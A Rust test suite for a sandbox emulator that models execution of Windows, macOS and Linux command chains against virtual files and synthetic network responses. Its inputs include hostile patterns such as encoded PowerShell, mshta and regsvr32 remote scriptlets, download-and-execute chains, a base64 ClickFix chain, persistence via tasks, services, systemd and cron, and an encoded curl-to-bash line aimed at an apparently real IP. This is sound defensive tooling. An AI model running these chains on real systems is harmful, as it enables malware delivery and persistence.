use std::collections::BTreeMap;

use base64::Engine as _;
use emulator_core::{AnalysisLimits, Engine, EventKind, Host, NetworkResponse};

use crate::{Runbox, RunboxInput};

#[test]
fn dispatches_encoded_powershell_without_host_execution() {
    let script = "Invoke-WebRequest 'https://example.invalid/payload'";
    let utf16 = script
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect::<Vec<_>>();
    let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
    let mut runbox = Runbox::default();

    let result = runbox
        .emulate(RunboxInput::RawCommand(format!(
            "powershell.exe -NoProfile -EncodedCommand {encoded}"
        )))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::NetworkIntent));
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "encoded-command.ps1"));
}

#[test]
fn cmd_writes_to_virtual_files_and_dispatches_children() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "echo harmless>C:\Temp\a.txt & powershell -Command Write-Output safe""#
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .virtual_files
        .iter()
        .any(|file| file.path.ends_with(r"\temp\a.txt")));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Output
            && event.data.get("value").is_some_and(|value| value == "safe")
    }));
}

#[test]
fn models_mshta_javascript_shell_run() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('powershell -Command Write-Output safe');close()""#
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::ProcessIntent));
}

#[test]
fn downloader_utilities_consume_synthetic_responses() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/tool.bin",
        NetworkResponse::text("fixture"),
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            "curl.exe -o C:\\Temp\\tool.bin https://example.invalid/tool.bin".into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\temp\tool.bin") && file.text.as_deref() == Some("fixture")
    }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::NetworkIntent));
}

#[test]
fn cmd_delayed_expansion_and_redirection_use_the_shared_host() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /v:on /c "set NAME=safe & echo !NAME!>C:\Temp\name.txt""#.into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\temp\name.txt") && file.text.as_deref() == Some("safe\r\n")
    }));
}

#[test]
fn cmd_download_then_powershell_file_executes_in_order() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/stage.ps1",
        NetworkResponse::text("Write-Output 'downloaded stage'"),
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "curl.exe -o C:\Temp\stage.ps1 https://example.invalid/stage.ps1 && powershell.exe -File C:\Temp\stage.ps1""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Output
            && event
                .data
                .get("value")
                .is_some_and(|value| value == "downloaded stage")
    }));
    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\temp\stage.ps1")
            && file
                .text
                .as_deref()
                .is_some_and(|text| text.contains("Write-Output"))
    }));
}

#[test]
fn batch_file_association_preserves_arguments_and_subroutines() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\stage.cmd",
            b"@echo off\r\ncall :show %1\r\ngoto :eof\r\n:show\r\necho argument=%1\r\nexit /b 0\r\n",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(r"C:\Temp\stage.cmd safe".into()))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "argument=safe" }));
}

#[test]
fn cmd_pipeline_filters_virtual_file_content() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "(echo alpha&echo beta-123&echo gamma-456)>C:\Temp\data.txt && type C:\Temp\data.txt | findstr [0-9]""#
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message.contains("beta-123") }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message.contains("gamma-456") }));
}

#[test]
fn cmd_for_f_consumes_synchronous_powershell_output() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "for /f %A in ('powershell.exe -Command \"Write-Output token-123\"') do echo value=%A""#
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "value=token-123" }));
}

#[test]
fn cmd_uses_external_exit_codes_for_conditional_chaining() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "missing-tool.exe && echo unexpected || echo fallback""#.into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "fallback" }));
    assert!(!result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "unexpected" }));
}

#[test]
fn runbox_models_xcopy_as_an_external_utility() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Users\analysis\source.txt",
            b"safe",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "xcopy source.txt copied.txt && type copied.txt""#.into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\users\analysis\copied.txt") && file.text.as_deref() == Some("safe")
    }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "safe"));
}

#[test]
fn schtasks_create_and_run_dispatches_the_registered_command() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "schtasks /create /tn SafeTask /tr \"cmd.exe /c echo scheduled\" /sc onlogon && schtasks /run /tn SafeTask""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::RegistryWrite
            && event
                .message
                .to_ascii_lowercase()
                .contains("scheduledtasks")
    }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "scheduled"));
}

#[test]
fn service_creation_and_start_dispatches_the_binary_path() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "sc create SafeSvc binPath= \"cmd.exe /c echo service-started\" && sc start SafeSvc""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::RegistryWrite
            && event
                .message
                .to_ascii_lowercase()
                .contains(r"services\safesvc")
    }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "service-started" }));
}

#[test]
fn netsh_and_cmdkey_write_only_redacted_virtual_state() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "netsh advfirewall firewall add rule name=SafeRule dir=in action=allow && cmdkey /add:example.invalid /user:tester /pass:secret""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::RegistryWrite
            && event.message.to_ascii_lowercase().contains("firewall")
    }));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::RegistryWrite
            && event.data.get("value").is_some_and(|value| {
                value.contains("PASSWORD=<redacted>") && !value.contains("secret")
            })
    }));
}

#[test]
fn wmic_process_create_returns_child_output_synchronously() {
    let mut runbox = Runbox::default();
    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "wmic process call create \"cmd.exe /c echo wmic-started\" | findstr ReturnValue""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Output && event.message.contains("ReturnValue = 0")
    }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "wmic-started"));
}

#[test]
fn msiexec_records_remote_package_without_installing_it() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/safe.msi",
        NetworkResponse {
            status: 200,
            headers: BTreeMap::default(),
            body: b"synthetic-msi".to_vec(),
        },
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            "msiexec.exe /i https://example.invalid/safe.msi /quiet".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "installer.msi"));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Unsupported
            && event.message.contains("MSI installation was blocked")));
}

#[test]
fn remote_hta_executes_jscript_and_dispatches_powershell() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/stage.hta",
        NetworkResponse::text(
            r#"<html><script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell.exe -Command Write-Output 'hta-stage'");
</script></html>"#,
        ),
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            "mshta.exe https://example.invalid/stage.hta".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "remote.hta"));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Output
            && event
                .data
                .get("value")
                .is_some_and(|value| value == "hta-stage")
    }));
}

#[test]
fn remote_regsvr32_scriptlet_dispatches_child_processes() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/stage.sct",
        NetworkResponse::text(
            r#"<scriptlet><registration><script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c echo scriptlet-stage");
</script></registration></scriptlet>"#,
        ),
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            "regsvr32.exe /s /n /u /i:https://example.invalid/stage.sct scrobj.dll".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "remote.sct"));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "scriptlet-stage"));
}

#[test]
fn vbscript_downloads_into_adodb_stream_and_saves_a_virtual_file() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/payload.bin",
        NetworkResponse {
            status: 200,
            headers: BTreeMap::default(),
            body: b"synthetic-payload".to_vec(),
        },
    );
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\download.vbs",
            br#"Dim request, stream
Set request = CreateObject("MSXML2.XMLHTTP")
request.Open "GET", "https://example.invalid/payload.bin", False
request.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write request.ResponseBody
stream.SaveToFile "C:\Temp\payload.bin", 2
"#,
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r"cscript.exe //nologo C:\Temp\download.vbs".into(),
        ))
        .unwrap();

    assert!(
        result.snapshot.virtual_files.iter().any(|file| {
            file.path.ends_with(r"\temp\payload.bin")
                && file.text.as_deref() == Some("synthetic-payload")
        }),
        "{:?}",
        result.snapshot.virtual_files
    );
}

#[test]
fn wscript_exec_exposes_synchronous_stdout_and_status() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\exec.js",
            br#"
var shell = new ActiveXObject("WScript.Shell");
var child = shell.Exec("cmd.exe /c echo captured-output");
WScript.Echo(child.Status);
WScript.Echo(child.StdOut.ReadAll());
WScript.Echo(child.StdOut.AtEndOfStream);
"#,
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r"cscript.exe //nologo C:\Temp\exec.js".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "captured-output"));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "1"));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "true"));
}

#[test]
fn wscript_run_wait_returns_the_child_exit_code() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\wait.js",
            br#"
var shell = new ActiveXObject("WScript.Shell");
WScript.Echo(shell.Run("cmd.exe /c exit /b 7", 0, true));
"#,
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r"cscript.exe //nologo C:\Temp\wait.js".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "7"));
}

#[test]
fn makecab_and_expand_round_trip_virtual_files() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\source.txt",
            b"cabinet-safe",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "makecab.exe C:\Temp\source.txt C:\Temp\source.cab && expand.exe C:\Temp\source.cab C:\Extracted""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\extracted\source.txt")
            && file.text.as_deref() == Some("cabinet-safe")
    }));
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "makecab-output.cab"));
}

#[test]
fn extrac32_extracts_modeled_cabinets() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\source.txt",
            b"extrac-safe",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "makecab.exe C:\Temp\source.txt C:\Temp\source.cab && extrac32.exe /Y /L C:\ExtracOut C:\Temp\source.cab""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\extracout\source.txt") && file.text.as_deref() == Some("extrac-safe")
    }));
}

#[test]
fn tar_create_and_extract_round_trip_virtual_files() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\tar-source.txt",
            b"tar-safe",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"cmd.exe /c "tar.exe -cf C:\Temp\safe.tar C:\Temp\tar-source.txt && tar.exe -xf C:\Temp\safe.tar -C C:\TarOut""#
                .into(),
        ))
        .unwrap();

    assert!(result.snapshot.virtual_files.iter().any(|file| {
        file.path.ends_with(r"\tarout\tar-source.txt") && file.text.as_deref() == Some("tar-safe")
    }));
}

#[test]
fn msbuild_exec_tasks_dispatch_child_commands() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\safe.proj",
            br#"<Project><Target Name="Safe"><Exec Command="cmd.exe /c echo msbuild-stage" /></Target></Project>"#,
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r"msbuild.exe C:\Temp\safe.proj".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "msbuild-stage"));
}

#[test]
fn cmstp_dispatches_run_pre_setup_commands() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\safe.inf",
            br"[DefaultInstall]
RunPreSetupCommands=SafeCommands
[SafeCommands]
cmd.exe /c echo cmstp-stage
",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r"cmstp.exe /s C:\Temp\safe.inf".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "cmstp-stage"));
}

#[test]
fn forfiles_substitutes_virtual_file_metadata() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(r"C:\Temp\one.txt", b"one", false, Engine::Runbox, 0)
        .unwrap();
    runbox
        .host_mut()
        .write_file(r"C:\Temp\two.bin", b"two", false, Engine::Runbox, 0)
        .unwrap();

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"forfiles.exe /P C:\Temp /M *.txt /C "cmd.exe /c echo @file""#.into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "one.txt"));
    assert!(!result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message.contains("two.bin")));
}

#[test]
fn installutil_and_control_only_inspect_virtual_pe_files() {
    let mut runbox = Runbox::default();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\safe.dll",
            b"MZ synthetic https://example.invalid/static",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();
    runbox
        .host_mut()
        .write_file(
            r"C:\Temp\safe.cpl",
            b"MZ synthetic control applet",
            false,
            Engine::Runbox,
            0,
        )
        .unwrap();

    let first = runbox
        .emulate(RunboxInput::RawCommand(
            r"installutil.exe C:\Temp\safe.dll".into(),
        ))
        .unwrap();
    assert!(first.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Parse && event.message.contains("statically inspected PE")
    }));

    let second = runbox
        .emulate(RunboxInput::RawCommand(
            r"control.exe C:\Temp\safe.cpl".into(),
        ))
        .unwrap();
    assert!(second.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Unsupported
            && event.message.contains("Control Panel applet exports")
    }));
}

#[test]
fn run_dialog_expands_comspec_and_models_finger_output() {
    let mut runbox = Runbox::default();
    runbox.host_mut().register_network_response(
        "FINGER",
        "finger://example.invalid/test",
        NetworkResponse::text(
            "header1\nheader2\nheader3\nheader4\nheader5\nheader6\nheader7\nheader8\ncmd.exe /c echo finger-stage",
        ),
    );

    let result = runbox
        .emulate(RunboxInput::RawCommand(
            r#"%COMSPEC% /c "for /f \"skip=8 delims=\" %h in ('finger test@example.invalid') do call %h""#
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::NetworkIntent
            && event.message.contains("finger://example.invalid/test")));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| event.kind == EventKind::Output && event.message == "finger-stage"));
}

#[test]
fn headless_conhost_dispatches_the_nested_clickfix_chain() {
    // Defanged: c[o]n[h]o[s]t[.]exe --headless c[m]d /c "... c[u]rl hXXps[:]//example[.]invalid/... t[a]r ... r[u]n[d]l[l]32 ..."
    let command = String::from_utf8(
        base64::engine::general_purpose::STANDARD
            .decode("IkM6XFdpbmRvd3NcU3lzdGVtMzJcY29uaG9zdC5leGUiIC0taGVhZGxlc3MgY21kIC9jICJta2RpciBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2UgJiBjdXJsLmV4ZSAtbyBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2VccGF5bG9hZC56aXAgaHR0cHM6Ly9leGFtcGxlLmludmFsaWQvcGF5bG9hZC56aXAgJiB0YXIuZXhlIC14ZiBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2VccGF5bG9hZC56aXAgLUMgQzpcVXNlcnNcUHVibGljXHN0YWdlICYgcnVuZGxsMzIuZXhlIEM6XFVzZXJzXFB1YmxpY1xzdGFnZVxwYXlsb2FkLmRsbCxTdGFydCI=")
            .unwrap(),
    )
    .unwrap();
    let mut runbox = Runbox::default();

    let result = runbox.emulate(RunboxInput::RawCommand(command)).unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::NetworkIntent
            && event
                .message
                .contains("https://example.invalid/payload.zip")
    }));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::FileWrite
            && event.message.ends_with(r"\users\public\stage\payload.zip")
    }));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Command
            && event
                .message
                .contains("dispatching virtual executable rundll32.exe")
    }));
    assert!(!result
        .snapshot
        .trace
        .iter()
        .any(|event| event.message == "unsupported executable: conhost.exe"));
}

#[test]
fn bash_script_uses_macos_virtual_files_and_process_dispatch() {
    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::BashScript(
            "printf 'echo staged\\n' > /tmp/stage.sh; chmod +x /tmp/stage.sh; /tmp/stage.sh".into(),
        ))
        .unwrap();

    assert_eq!(
        result
            .snapshot
            .virtual_files
            .iter()
            .find(|file| file.path == "/tmp/stage.sh")
            .and_then(|file| file.text.as_deref()),
        Some("echo staged\n")
    );
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::ProcessIntent
            && event
                .data
                .get("program")
                .is_some_and(|program| program == "/tmp/stage.sh")
    }));
}

#[test]
fn osascript_dispatches_nested_shell_commands() {
    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::BashScript(
            r#"osascript -e 'do shell script "echo nested > /tmp/apple.txt"'"#.into(),
        ))
        .unwrap();

    assert_eq!(
        result
            .snapshot
            .virtual_files
            .iter()
            .find(|file| file.path == "/tmp/apple.txt")
            .and_then(|file| file.text.as_deref()),
        Some("nested\n")
    );
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "osascript.applescript"));
}

#[test]
fn bash_download_write_chmod_execute_chain_is_modeled_end_to_end() {
    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
    runbox.host_mut().register_network_response(
        "GET",
        "https://example.invalid/stage.sh",
        NetworkResponse::text("echo staged\n"),
    );
    let result = runbox
        .emulate(RunboxInput::BashScript(
            "curl -o /tmp/stage.sh https://example.invalid/stage.sh; chmod +x /tmp/stage.sh; /tmp/stage.sh"
                .into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .network_activity
        .iter()
        .any(|activity| { activity.url == "https://example.invalid/stage.sh" }));
    assert_eq!(
        result
            .snapshot
            .virtual_files
            .iter()
            .find(|file| file.path == "/tmp/stage.sh")
            .and_then(|file| file.text.as_deref()),
        Some("echo staged\n")
    );
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::ProcessIntent
            && event
                .data
                .get("program")
                .is_some_and(|program| program == "/tmp/stage.sh")
    }));
}

#[test]
fn macos_base64_pipeline_and_nohup_execute_shell_stdin() {
    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
    runbox.host_mut().register_network_response(
        "GET",
        "http://45.135.232.33/d/roberto99223",
        NetworkResponse::text("echo decoded > /tmp/odyssey.txt"),
    );
    let result = runbox
        .emulate(RunboxInput::BashScript(
            r#"echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG85OTIyMyB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash"#
                .into(),
        ))
        .unwrap();

    let decoded = result
        .snapshot
        .virtual_files
        .iter()
        .find(|file| file.path == "/tmp/odyssey.txt")
        .and_then(|file| file.text.as_deref());
    assert_eq!(
        decoded,
        Some("decoded\n"),
        "trace: {:#?}",
        result.snapshot.trace
    );
}

#[test]
fn linux_systemd_unit_and_enable_are_modeled_as_persistence() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            r"
printf '[Service]\nExecStart=/tmp/agent\n' > /etc/systemd/system/example.service
systemctl enable --now /etc/systemd/system/example.service
"
            .into(),
        ))
        .unwrap();

    assert_eq!(
        result
            .snapshot
            .virtual_files
            .iter()
            .find(|file| file.path == "/etc/systemd/system/example.service")
            .and_then(|file| file.text.as_deref()),
        Some("[Service]\nExecStart=/tmp/agent\n")
    );
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Persistence
            && event
                .data
                .get("persistence_kind")
                .is_some_and(|kind| kind == "linux_systemd")
    }));
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "systemd-unit"));
}

#[test]
fn linux_crontab_and_privilege_wrappers_dispatch_end_to_end() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            r"
printf '* * * * * /tmp/agent\n' > /tmp/jobs
sudo crontab /tmp/jobs
"
            .into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Persistence
            && event
                .data
                .get("persistence_kind")
                .is_some_and(|kind| kind == "linux_cron")
    }));
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "crontab"));
}

#[test]
fn linux_base64_and_identity_utilities_return_synchronous_output() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            "printf 'c2FmZQ==' | base64 -d; whoami; uname -a".into(),
        ))
        .unwrap();

    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "safe" }));
    assert!(result
        .snapshot
        .trace
        .iter()
        .any(|event| { event.kind == EventKind::Output && event.message == "analysis" }));
    assert!(result.snapshot.trace.iter().any(|event| {
        event.kind == EventKind::Output && event.message.contains("analysis-linux")
    }));
}

#[test]
fn linux_inline_interpreter_can_dispatch_nested_shell_behavior() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            r#"python3 -c 'import os; os.system("echo nested > /tmp/python.txt")'"#.into(),
        ))
        .unwrap();

    assert_eq!(
        result
            .snapshot
            .virtual_files
            .iter()
            .find(|file| file.path == "/tmp/python.txt")
            .and_then(|file| file.text.as_deref()),
        Some("nested\n")
    );
    assert!(result
        .snapshot
        .artifacts
        .iter()
        .any(|artifact| artifact.name == "python3-inline-script"));
}

#[test]
fn linux_package_security_and_remote_access_utilities_are_typed() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            "apt-get install example; ufw disable; ssh analysis@example.invalid".into(),
        ))
        .unwrap();

    assert!(result.snapshot.trace.iter().any(|event| {
        event
            .data
            .get("package_operation")
            .is_some_and(|value| value == "true")
    }));
    assert!(result.snapshot.trace.iter().any(|event| {
        event
            .data
            .get("security_control")
            .is_some_and(|value| value == "true")
    }));
    assert!(result
        .snapshot
        .network_activity
        .iter()
        .any(|activity| activity.url == "tcp://example.invalid"));
}

#[test]
fn linux_systemd_reload_is_not_persistence_by_itself() {
    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
    let result = runbox
        .emulate(RunboxInput::LinuxShellScript(
            "systemctl daemon-reload".into(),
        ))
        .unwrap();

    assert!(!result.snapshot.trace.iter().any(|event| {
        event
            .data
            .get("persistence_kind")
            .is_some_and(|kind| kind == "linux_systemd")
    }));
}
